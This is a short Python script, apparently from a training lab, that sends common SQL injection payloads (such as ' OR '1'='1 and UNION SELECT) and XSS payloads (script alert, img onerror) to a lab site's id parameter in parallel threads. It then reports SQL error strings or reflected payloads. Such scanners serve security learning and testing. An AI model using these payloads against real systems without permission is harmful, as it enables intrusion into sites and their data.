import requests   # HTTP library — Session, get/post, response.text
import re         # Regular expressions (imported but unused here)
import threading  # Run multiple payload tests in parallel

# Target: the `id` parameter is our injection point
url = "http://python.thm/labs/lab2/greetings.php?id="

# Payloads grouped by attack type
payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS":  ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

# Common strings that appear when SQL errors leak to the page (error-based SQLi)
sqli_errors = [
    "SQL syntax", "SQLite3::query():", "MySQL server", "syntax error",
    "Unclosed quotation mark", "near 'SELECT'", "Unknown column",
    "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    # Send the payload as the `id` query parameter
    response = requests.get(url, params={"id": payload})
    content = response.text.lower()  # lowercase body for case-insensitive checks

    # SQLi: flag if any known SQL error string appears in the response
    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    # XSS: flag if our exact payload is reflected back in the HTML
    # (detects reflection only — not actual JS execution)
    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

# Launch one thread per payload so all tests run concurrently
threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for every worker thread to finish before exiting
for t in threads:
    t.join()